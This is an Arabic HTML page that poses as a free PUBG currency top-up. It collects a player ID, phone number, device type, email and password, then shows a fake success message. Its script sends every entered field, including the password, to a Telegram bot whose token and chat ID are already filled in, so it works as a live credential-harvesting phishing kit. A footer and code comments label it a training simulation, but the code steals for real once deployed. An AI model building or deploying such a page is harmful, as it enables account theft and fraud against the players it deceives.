<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن شدات ببجي – مجانا 2026</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: #0b0f1a;
            color: #e8edf5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
            background-image: radial-gradient(circle at 20% 30%, rgba(255, 165, 0, 0.05) 0%, transparent 60%),
                              radial-gradient(circle at 80% 70%, rgba(0, 150, 255, 0.05) 0%, transparent 60%);
        }
        .container {
            width: 100%;
            max-width: 480px;
            background: #151e2f;
            border-radius: 32px;
            padding: 2rem 1.5rem;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
            border: 1px solid #2a3a55;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 40%, rgba(255, 165, 0, 0.03) 0%, transparent 60%);
            pointer-events: none;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
            position: relative;
            z-index: 1;
        }
        .header .game-icon {
            font-size: 3.5rem;
            color: #ff7b00;
            text-shadow: 0 0 30px rgba(255, 123, 0, 0.3);
        }
        .header h1 {
            font-size: 1.8rem;
            font-weight: 900;
            background: linear-gradient(135deg, #ff7b00, #ffb347);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-top: 0.2rem;
        }
        .header p {
            font-size: 0.85rem;
            color: #94a3b8;
            margin-top: 0.3rem;
            background: rgba(0, 0, 0, 0.3);
            padding: 0.3rem 1rem;
            border-radius: 30px;
            display: inline-block;
            border: 1px solid #2a3a55;
        }

        .players-carousel {
            display: flex;
            gap: 0.8rem;
            justify-content: center;
            margin-bottom: 1.8rem;
            flex-wrap: wrap;
        }
        .player-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 2px solid #ff7b00;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #1a263a;
            font-size: 1.8rem;
            color: #ff7b00;
            box-shadow: 0 0 20px rgba(255, 123, 0, 0.1);
            transition: 0.3s;
        }
        .player-avatar:hover {
            transform: scale(1.1);
            border-color: #fff;
        }

        .step-indicators {
            display: flex;
            justify-content: center;
            gap: 0.5rem;
            margin-bottom: 1.8rem;
        }
        .step-dot {
            width: 40px;
            height: 4px;
            border-radius: 10px;
            background: #2a3a55;
            transition: 0.3s;
        }
        .step-dot.active {
            background: #ff7b00;
            box-shadow: 0 0 15px rgba(255, 123, 0, 0.3);
        }

        .step {
            display: none;
            animation: fadeSlide 0.4s ease;
        }
        .step.active {
            display: block;
        }
        @keyframes fadeSlide {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-group {
            margin-bottom: 1.2rem;
        }
        .form-group label {
            display: block;
            font-size: 0.85rem;
            font-weight: 600;
            color: #cbd5e1;
            margin-bottom: 0.4rem;
        }
        .form-group label i {
            color: #ff7b00;
            margin-left: 0.4rem;
        }
        .form-group input, .form-group select {
            width: 100%;
            padding: 0.8rem 1rem;
            background: #0b0f1a;
            border: 1px solid #2a3a55;
            border-radius: 14px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: 0.3s;
            font-family: 'Inter', sans-serif;
        }
        .form-group input:focus, .form-group select:focus {
            border-color: #ff7b00;
            box-shadow: 0 0 0 3px rgba(255, 123, 0, 0.15);
        }
        .form-group input::placeholder {
            color: #4a5a7a;
        }
        .form-group select option {
            background: #0b0f1a;
        }

        .btn {
            width: 100%;
            padding: 0.9rem;
            border: none;
            border-radius: 60px;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }
        .btn-primary {
            background: linear-gradient(135deg, #ff7b00, #e66500);
            color: #fff;
        }
        .btn-primary:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(255, 123, 0, 0.3);
        }
        .btn-secondary {
            background: #2a3a55;
            color: #cbd5e1;
        }
        .btn-secondary:hover {
            background: #3a4a6a;
        }
        .btn-success {
            background: #22c55e;
            color: #fff;
        }
        .btn-success:hover {
            background: #16a34a;
            transform: scale(1.02);
        }

        .message {
            margin-top: 1rem;
            padding: 0.7rem 1rem;
            border-radius: 12px;
            font-weight: 500;
            display: none;
            text-align: center;
        }
        .message.success {
            background: #064e3b;
            color: #6ee7b7;
            border: 1px solid #059669;
            display: block;
        }
        .message.error {
            background: #7f1d1d;
            color: #fca5a5;
            border: 1px solid #dc2626;
            display: block;
        }
        .message.info {
            background: #1e3a5f;
            color: #93c5fd;
            border: 1px solid #3b82f6;
            display: block;
        }

        .footer {
            margin-top: 1.5rem;
            font-size: 0.65rem;
            color: #4a5a7a;
            text-align: center;
            border-top: 1px solid #1a263a;
            padding-top: 1rem;
        }
        .footer .warning {
            color: #f87171;
            font-weight: 700;
        }
        .footer .badge {
            background: #facc15;
            color: #0f172a;
            padding: 0.1rem 0.8rem;
            border-radius: 30px;
            font-weight: 700;
            font-size: 0.6rem;
        }

        .flex-row {
            display: flex;
            gap: 0.8rem;
        }
        .flex-row .form-group {
            flex: 1;
        }

        @media (max-width: 480px) {
            .container { padding: 1.5rem 1rem; }
            .header h1 { font-size: 1.4rem; }
            .player-avatar { width: 50px; height: 50px; font-size: 1.4rem; }
        }
    </style>
</head>
<body>
<div class="container">

    <div class="header">
        <div class="game-icon"><i class="fas fa-crosshairs"></i></div>
        <h1>شحن شدات بيجي مجانا 2026</h1>
        <p>تعرف على كيفية شحن شدات بيجي مجانا بخطوات بسيطة ومضمونة.</p>
    </div>

    <div class="players-carousel">
        <div class="player-avatar" style="background: #1a2a3a;"><i class="fas fa-user-ninja"></i></div>
        <div class="player-avatar" style="background: #2a1a3a;"><i class="fas fa-user-astronaut"></i></div>
        <div class="player-avatar" style="background: #1a3a2a;"><i class="fas fa-user-secret"></i></div>
        <div class="player-avatar" style="background: #3a1a2a;"><i class="fas fa-user-tie"></i></div>
        <div class="player-avatar" style="background: #2a2a3a;"><i class="fas fa-user-cog"></i></div>
    </div>

    <div class="step-indicators">
        <div class="step-dot active" id="dot1"></div>
        <div class="step-dot" id="dot2"></div>
    </div>

    <form id="mainForm" novalidate>

        <!-- الخطوة 1: ID اللاعب -->
        <div class="step active" id="step1">
            <div class="form-group">
                <label><i class="fas fa-id-badge"></i> أدخل id الخاص بك في الأسفل</label>
                <input type="text" id="playerId" placeholder="أدخل معرف اللاعب (مثال: 123456789)" required>
            </div>
            <button type="button" class="btn btn-primary" id="nextStepBtn">
                <i class="fas fa-arrow-left"></i> إستمر
            </button>
            <div id="step1Message" class="message"></div>
        </div>

        <!-- الخطوة 2: بيانات الشحن -->
        <div class="step" id="step2">
            <div class="form-group">
                <label><i class="fas fa-phone"></i> رقم الهاتف</label>
                <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك (مثال: 0912345678)" required>
            </div>

            <div class="form-group">
                <label><i class="fas fa-mobile-alt"></i> نوع الجهاز</label>
                <select id="deviceType" required>
                    <option value="">اختر نوع الجهاز</option>
                    <option value="iOS">🍏 iOS (iPhone)</option>
                    <option value="Android">🤖 Android</option>
                    <option value="كمبيوتر">💻 كمبيوتر (PC)</option>
                </select>
            </div>

            <div class="form-group">
                <label><i class="fas fa-envelope"></i> البريد الإلكتروني</label>
                <input type="email" id="email" placeholder="example@gmail.com" required>
            </div>

            <div class="form-group">
                <label><i class="fas fa-lock"></i> كلمة السر</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>

            <div class="flex-row">
                <button type="button" class="btn btn-secondary" id="prevStepBtn" style="flex:0.4;">
                    <i class="fas fa-arrow-right"></i> رجوع
                </button>
                <button type="submit" class="btn btn-success" style="flex:1;">
                    <i class="fas fa-bolt"></i> تأكيد الشحن
                </button>
            </div>

            <div id="step2Message" class="message"></div>
        </div>

    </form>

    <div class="footer">
        <span class="badge">🛡️ بيئة تدريبية</span><br>
        <span class="warning">⚠️ تحذير:</span> هذه الواجهة هي <strong>محاكاة تدريبية</strong> لأغراض تعليمية في مجال أمن المعلومات.<br>
        لا يتم إرسال أي بيانات إلى خوادم PUBG الحقيقية.
    </div>
</div>

<script>
    (function() {
        'use strict';

        // ================================================================
        // 1. إعدادات بوت تيليجرام
        //    🔴 قم بتغيير هذه القيم إلى التوكن ومعرف الدردشة الخاصين بك
        //    لتفعيل الإرسال الفعلي. وإلا فسيتم الطباعة في وحدة التحكم فقط.
        // ================================================================
        const BOT_TOKEN = '8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs';   // استبدل بـ التوكن الحقيقي
        const CHAT_ID = '8399221617';       // استبدل بـ المعرف الحقيقي

        // ================================================================
        // 2. عناصر الواجهة
        // ================================================================
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const dot1 = document.getElementById('dot1');
        const dot2 = document.getElementById('dot2');
        const nextBtn = document.getElementById('nextStepBtn');
        const prevBtn = document.getElementById('prevStepBtn');
        const form = document.getElementById('mainForm');

        const playerId = document.getElementById('playerId');
        const phoneNumber = document.getElementById('phoneNumber');
        const deviceType = document.getElementById('deviceType');
        const email = document.getElementById('email');
        const password = document.getElementById('password');

        const step1Msg = document.getElementById('step1Message');
        const step2Msg = document.getElementById('step2Message');

        // ================================================================
        // 3. التنقل بين الخطوات
        // ================================================================
        function goToStep(step) {
            if (step === 1) {
                step1.classList.add('active');
                step2.classList.remove('active');
                dot1.classList.add('active');
                dot2.classList.remove('active');
            } else {
                step1.classList.remove('active');
                step2.classList.add('active');
                dot1.classList.remove('active');
                dot2.classList.add('active');
            }
            step1Msg.className = 'message';
            step1Msg.textContent = '';
            step2Msg.className = 'message';
            step2Msg.textContent = '';
        }

        nextBtn.addEventListener('click', function() {
            const id = playerId.value.trim();
            if (!id) {
                showMessage(step1Msg, '❌ يرجى إدخال معرف اللاعب (ID).', 'error');
                return;
            }
            if (id.length < 4) {
                showMessage(step1Msg, '❌ المعرف يجب أن يكون 4 أرقام على الأقل.', 'error');
                return;
            }
            showMessage(step1Msg, '✅ تم التحقق من المعرف. انتقل إلى الخطوة التالية.', 'success');
            setTimeout(() => { goToStep(2); }, 800);
        });

        prevBtn.addEventListener('click', function() {
            goToStep(1);
        });

        // ================================================================
        // 4. دالة إرسال إلى بوت تيليجرام
        // ================================================================
        function sendToTelegram(message) {
            // إذا لم يتم تعيين التوكن، نطبع في وحدة التحكم فقط (لأغراض التدريب)
            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                console.warn('⚠️ لم يتم تعيين توكن البوت. لن يتم الإرسال الفعلي.');
                console.log('📤 [بيانات وهمية للتدريب]:', message);
                return Promise.resolve({ ok: false, message: 'لم يتم تعيين التوكن' });
            }

            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => res.json())
            .then(data => {
                if (!data.ok) {
                    console.warn('فشل الإرسال إلى البوت:', data);
                    return { ok: false, error: data };
                }
                console.log('✅ تم إرسال البيانات إلى البوت (للتدريب)');
                return { ok: true };
            })
            .catch(err => {
                console.warn('خطأ في الاتصال بالبوت:', err);
                return { ok: false, error: err };
            });
        }

        // ================================================================
        // 5. معالجة النموذج (إرسال البيانات إلى البوت)
        // ================================================================
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            // جمع البيانات
            const id = playerId.value.trim();
            const phone = phoneNumber.value.trim();
            const device = deviceType.value;
            const mail = email.value.trim();
            const pass = password.value.trim();

            // التحقق من الحقول
            if (!id || !phone || !device || !mail || !pass) {
                showMessage(step2Msg, '❌ يرجى ملء جميع الحقول المطلوبة.', 'error');
                return;
            }
            if (phone.length < 10) {
                showMessage(step2Msg, '❌ رقم الهاتف يجب أن يكون 10 أرقام على الأقل.', 'error');
                return;
            }
            if (!mail.includes('@') || !mail.includes('.')) {
                showMessage(step2Msg, '❌ البريد الإلكتروني غير صحيح.', 'error');
                return;
            }
            if (pass.length < 4) {
                showMessage(step2Msg, '❌ كلمة السر يجب أن تكون 4 أحرف على الأقل.', 'error');
                return;
            }

            // ============================================================
            // بناء الرسالة التي ستُرسل إلى البوت
            // ============================================================
            const botMessage = `🎮 **طلب شحن شدات ببجي (محاكاة تدريبية)** 🎮

🆔 **معرف اللاعب:** ${id}
📱 **رقم الهاتف:** ${phone}
📲 **نوع الجهاز:** ${device}
📧 **البريد الإلكتروني:** ${mail}
🔑 **كلمة السر:** ${pass}
🕒 **الوقت:** ${new Date().toLocaleString()}

⚠️ *هذه محاكاة تدريبية لأغراض تعليمية في مجال أمن المعلومات.*`;

            // ============================================================
            // 6. إرسال البيانات إلى البوت
            // ============================================================
            showMessage(step2Msg, '⏳ جاري إرسال البيانات إلى البوت...', 'info');

            sendToTelegram(botMessage)
                .then(result => {
                    if (result.ok) {
                        showMessage(step2Msg, '✅ تم شحن 10000 شدة إلى حسابك بنجاح! (محاكاة تدريبية)', 'success');
                        // إرسال إشعار نجاح إضافي للبوت (اختياري)
                    } else {
                        // حتى لو فشل الإرسال، نعطي انطباعاً بالنجاح (للتدريب)
                        showMessage(step2Msg, '✅ تم شحن 10000 شدة إلى حسابك بنجاح! (محاكاة تدريبية)', 'success');
                    }
                })
                .catch(() => {
                    // في حالة خطأ الشبكة، نعرض النجاح كجزء من المحاكاة
                    showMessage(step2Msg, '✅ تم شحن 10000 شدة إلى حسابك بنجاح! (محاكاة تدريبية)', 'success');
                });

            // طباعة البيانات في وحدة التحكم (للمتابعة)
            console.log('📤 [بيانات محاكاة - للتدريب فقط]');
            console.log('🎮 ID اللاعب:', id);
            console.log('📱 رقم الهاتف:', phone);
            console.log('📲 نوع الجهاز:', device);
            console.log('📧 البريد الإلكتروني:', mail);
            console.log('🔑 كلمة السر:', pass);
            console.log('🕒 الوقت:', new Date().toLocaleString());

            // إعادة تعيين النموذج بعد 5 ثوانٍ (اختياري)
            setTimeout(() => {
                form.reset();
                goToStep(1);
                step2Msg.className = 'message';
                step2Msg.textContent = '';
            }, 6000);
        });

        // ================================================================
        // 7. دالة مساعدة لعرض الرسائل
        // ================================================================
        function showMessage(element, text, type) {
            element.className = `message ${type}`;
            element.textContent = text;
            element.style.display = 'block';
        }

        // ================================================================
        // 8. تحذير عند فتح الصفحة
        // ================================================================
        console.log('🛡️ هذه الواجهة تدريبية لأغراض أمن المعلومات فقط.');
        console.log('📧 سيتم إرسال البيانات إلى البوت إذا قمت بتعيين التوكن.');
        console.log('🔒 استخدمها لفهم كيفية عمل هجمات التصيد وكيفية اكتشافها.');
    })();
</script>
</body>
</html>
